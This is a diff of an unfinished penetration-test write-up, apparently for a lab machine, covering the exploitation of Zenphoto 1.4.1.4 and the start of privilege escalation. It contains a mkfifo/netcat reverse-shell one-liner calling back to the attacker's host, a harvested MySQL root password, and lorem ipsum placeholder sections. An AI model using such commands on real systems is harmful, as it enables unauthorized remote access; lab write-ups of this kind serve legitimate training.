@@ -282,6 +282,12 @@ while(1)
 ?>
 ```
 
+
+---
+
+# Exploitation
+## Zenphoto version 1.4.1.4 exploit
+
 #### -Input the above script into a file named "shell.php" on kali machine
 
 #### -Typed "php shell.php 192.168.53.41 /test/" on kali machine and received the below restricted shell:
@@ -292,28 +298,29 @@ while(1)
 
 #### -Typed "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 	[kali tun0 IP]:80 >/tmp/f" and received a stable shell:
 
-
-
----
-
-# Exploitation
-## Name of the technique
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
----
-
-# Lateral Movement to user
-## Local Enumeration
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
-## Lateral Movement vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+![](Pasted%20image%2020221111201646.png)
 
 ---
 
 # Privilege Escalation
 ## Local Enumeration
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+
+#### -Navigated to "/var/www/html/zp-data", cat'd file "zp-config.php" and found the below credentials to login to mysql database:
+
+$conf['mysql_user'] = 'root';           // Supply your Database user id.
+$conf['mysql_pass'] = 'hola';           // Supply your Database password.
+$conf['mysql_host'] = 'localhost';  // Supply the name of your Database server.
+$conf['mysql_database'] = 'zenphoto';       // Supply the name of Zenphoto's database 
+
+![](Pasted%20image%2020221111202027.png)
+
+![](Pasted%20image%2020221111202056.png)
+
+#### -Uploaded and ran"linpeas.sh" on target machine 
+
+#### -Was unable to find any privilege escalation vectors from output so I googled "Linux 2.6.32 exploit" as from the linpeas output it showed target machine running OS Linux 2.6.32. Found the following link/web page:
+
+
 
 ## Privilege Escalation vector
 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
